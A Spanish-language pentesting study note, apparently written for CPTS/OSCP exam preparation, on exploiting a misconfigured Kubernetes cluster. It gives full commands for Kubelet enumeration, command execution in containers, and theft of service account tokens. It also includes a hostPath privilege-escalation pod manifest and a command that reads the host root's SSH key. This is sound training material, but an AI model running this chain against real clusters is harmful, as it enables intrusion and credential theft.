
Kubernetes (K8s) es una plataforma de **orquestación de contenedores** que permite administrar aplicaciones distribuidas entre diferentes nodos.

En pentesting, una configuración insegura de Kubernetes puede permitirnos:

- Enumerar pods y contenedores.
    
- Ejecutar comandos dentro de contenedores.
    
- Obtener tokens de cuentas de servicio.
    
- Crear pods con acceso al sistema de archivos del host.
    
- Acceder a archivos sensibles del host, incluso los de `root`.
    

## 1. Conceptos importantes

|Componente|Descripción|
|---|---|
|Control Plane|Administra y coordina el clúster.|
|Worker Node|Máquina donde se ejecutan los contenedores.|
|Pod|Unidad que contiene uno o varios contenedores.|
|API Server|Permite interactuar con Kubernetes mediante su API.|
|Kubelet|Agente que administra los pods de cada nodo.|
|etcd|Almacena la configuración y el estado del clúster.|
|RBAC|Controla qué acciones puede realizar cada usuario o cuenta.|
|Service Account|Identidad utilizada por aplicaciones y procesos dentro del clúster.|

### Puertos importantes

|Puerto|Servicio|
|---|---|
|`6443`|Kubernetes API Server|
|`10250`|Kubelet API|
|`10255`|Read-Only Kubelet API|
|`2379/2380`|etcd|
|`10251`|Scheduler|
|`10252`|Controller Manager|

**Nota:** Estos son los puertos indicados en el módulo. Algunos corresponden a configuraciones antiguas y pueden variar en versiones actuales.

## 2. Enumeración de Kubernetes

### Comprobar el API Server

```
curl -k https://<IP>:6443
```

Ejemplo de respuesta:

```
{
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "code": 403
}
```

Esto indica que el servidor responde, pero nuestra petición anónima no tiene permisos para acceder a esa ruta.

### Enumerar pods mediante Kubelet

```
curl -sk https://<IP>:10250/pods | jq .
```

Si el endpoint es accesible, podemos obtener información como:

- Nombres de los pods.
    
- Namespaces.
    
- Contenedores e imágenes utilizadas.
    
- Versiones de las imágenes.
    
- Configuraciones de los pods.
    

Esta información puede revelar servicios vulnerables o configuraciones sensibles.

### Enumerar pods con kubeletctl

```
kubeletctl -i --server <IP> pods
```

Ejemplo:

```
POD                  NAMESPACE      CONTAINERS
nginx                default        nginx
coredns-78fcd69978  kube-system     coredns
etcd-steamcloud      kube-system     etcd
```

## 3. Ejecución remota de comandos (RCE)

Si Kubelet permite operaciones sin la autorización adecuada, podemos intentar ejecutar comandos dentro de los contenedores.

### Identificar contenedores vulnerables

```
kubeletctl -i --server <IP> scan rce
```

La herramienta comprueba qué contenedores permiten ejecutar comandos.

Ejemplo:

```
PODS              NAMESPACE       CONTAINERS     RCE
nginx             default         nginx          +
etcd-steamcloud   kube-system     etcd           -
```

El símbolo `+` indica que la herramienta ha identificado la posibilidad de ejecutar comandos.

### Ejecutar comandos

```
kubeletctl -i --server <IP> exec "id" -p nginx -c nginx
```

Parámetros:

- `-p`: nombre del pod.
    
- `-c`: nombre del contenedor.
    
- `exec`: comando que queremos ejecutar.
    

Ejemplo:

```
uid=0(root) gid=0(root) groups=0(root)
```

**Importante:** Ser `root` dentro del contenedor no significa automáticamente ser `root` en el host.

---

## 4. Extraer el token de la Service Account

Si tenemos ejecución de comandos dentro de un contenedor, podemos intentar recuperar las credenciales de su cuenta de servicio.

### Extraer el token

```
kubeletctl -i --server <IP> exec \
"cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
-p nginx -c nginx > k8.token
```

Este token puede permitirnos autenticarnos contra el API Server con los permisos de la Service Account.

### Extraer el certificado CA

```
kubeletctl -i --server <IP> exec \
"cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
-p nginx -c nginx > ca.crt
```

El certificado `ca.crt` permite verificar la identidad TLS del servidor.

**Nota:** Estos archivos deben estar presentes en el contenedor. No todos los pods tienen montado automáticamente el token.

---

## 5. Enumerar privilegios de la Service Account

Una vez obtenido el token:

```
export token=$(cat k8.token)
```

Comprobamos sus permisos:

```
kubectl --token="$token" \
--certificate-authority=ca.crt \
--server=https://<IP>:6443 \
auth can-i --list
```

Ejemplo:

```
Resources    Verbs
pods         [get create list]
```

Los permisos importantes son:

|Permiso|Descripción|
|---|---|
|`get`|Consultar un recurso.|
|`list`|Enumerar recursos.|
|`create`|Crear nuevos recursos.|
|`update`|Modificar recursos existentes.|
|`delete`|Eliminar recursos.|

**El permiso** `**create**` **sobre** `**pods**` **es especialmente interesante**, ya que puede permitir crear un contenedor con acceso al sistema de archivos del host si las políticas del clúster lo permiten.

## 6. Escalada mediante un pod con hostPath

Si podemos crear pods y el clúster permite montar directorios del host, podemos intentar montar `/` dentro de un contenedor.

### Crear el archivo privesc.yaml

```
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

**Explicación:**

- `name: privesc`: nombre del nuevo pod.
    
- `image: nginx:1.14.2`: imagen utilizada.
    
- `hostPath: /`: selecciona la raíz del sistema de archivos del host.
    
- `mountPath: /root`: monta esa raíz dentro del contenedor en `/root`.
    
- `hostNetwork: true`: utiliza la red del host.
    
- `automountServiceAccountToken: true`: habilita el montaje automático del token de la cuenta de servicio.
    

La parte fundamental es:

```
volumeMounts:
- mountPath: /root
  name: mount-root-into-mnt

volumes:
- name: mount-root-into-mnt
  hostPath:
    path: /
```

Esto hace que el directorio `/` del host aparezca dentro del contenedor en `/root`.

Por ejemplo:

```
HOST                         CONTENEDOR

/etc/passwd           →       /root/etc/passwd
/home                 →       /root/home
/root/.ssh/id_rsa      →       /root/root/.ssh/id_rsa
```

### Crear el pod

```
kubectl --token="$token" \
--certificate-authority=ca.crt \
--server=https://<IP>:6443 \
apply -f privesc.yaml
```

### Comprobar su estado

```
kubectl --token="$token" \
--certificate-authority=ca.crt \
--server=https://<IP>:6443 \
get pods
```

Resultado esperado:

```
NAME       READY   STATUS
nginx      1/1     Running
privesc    1/1     Running
```

**Importante:** Este ataque requiere que Kubernetes permita crear el pod con ese volumen `hostPath` y que los permisos del contenedor permitan acceder a los archivos deseados.

---

## 7. Acceder a archivos del host

Una vez creado el pod, podemos utilizar `kubeletctl` para acceder al sistema de archivos montado.

### Comprobar nuestro usuario

```
kubeletctl --server <IP> exec \
"id" -p privesc -c privesc
```

### Leer la clave SSH de root

```
kubeletctl --server <IP> exec \
"cat /root/root/.ssh/id_rsa" \
-p privesc -c privesc
```

La ruta contiene dos veces `root` porque:

- El primer `/root` corresponde al punto de montaje dentro del contenedor.
    
- El segundo `/root` corresponde al directorio del usuario root del host.
    

Si tenemos permisos suficientes, podremos acceder a la clave privada SSH del host.

## 8. Resumen del proceso de explotación

**1. Identificar los servicios Kubernetes:**

```
curl -k https://<IP>:6443
curl -sk https://<IP>:10250/pods | jq .
```

**2. Enumerar los pods:**

```
kubeletctl -i --server <IP> pods
```

**3. Buscar ejecución remota de comandos:**

```
kubeletctl -i --server <IP> scan rce
```

**4. Ejecutar comandos dentro de un contenedor:**

```
kubeletctl -i --server <IP> exec "id" -p nginx -c nginx
```

**5. Extraer el token y el certificado:**

```
kubeletctl -i --server <IP> exec \
"cat /var/run/secrets/kubernetes.io/serviceaccount/token" \
-p nginx -c nginx > k8.token

kubeletctl -i --server <IP> exec \
"cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" \
-p nginx -c nginx > ca.crt
```

**6. Comprobar permisos:**

```
export token=$(cat k8.token)

kubectl --token="$token" \
--certificate-authority=ca.crt \
--server=https://<IP>:6443 \
auth can-i --list
```

**7. Si podemos crear pods, intentar montar el host:**

```
kubectl --token="$token" \
--certificate-authority=ca.crt \
--server=https://<IP>:6443 \
apply -f privesc.yaml
```

**8. Acceder a los archivos del host:**

```
kubeletctl --server <IP> exec \
"cat /root/root/.ssh/id_rsa" \
-p privesc -c privesc
```

### Puntos clave para CPTS/OSCP

- **Puerto 6443:** API Server de Kubernetes.
    
- **Puerto 10250:** API de Kubelet.
    
- `**kubeletctl pods**`**:** enumerar pods.
    
- `**kubeletctl scan rce**`**:** buscar contenedores donde podamos ejecutar comandos.
    
- `**kubeletctl exec**`**:** ejecutar comandos dentro de un contenedor.
    
- **Service Account Token:** permite autenticarnos contra la API con los permisos de esa cuenta.
    
- `**kubectl auth can-i --list**`**:** enumerar permisos.
    
- `**create pods**` **+** `**hostPath: /**`**:** posible vía de acceso al sistema de archivos del host.
    

**Cadena de explotación del módulo:**

`Kubelet expuesto → RCE en contenedor → Token de Service Account → Permisos para crear pods → Pod con hostPath → Acceso a archivos del host`

La explotación depende de las configuraciones y permisos reales del clúster.
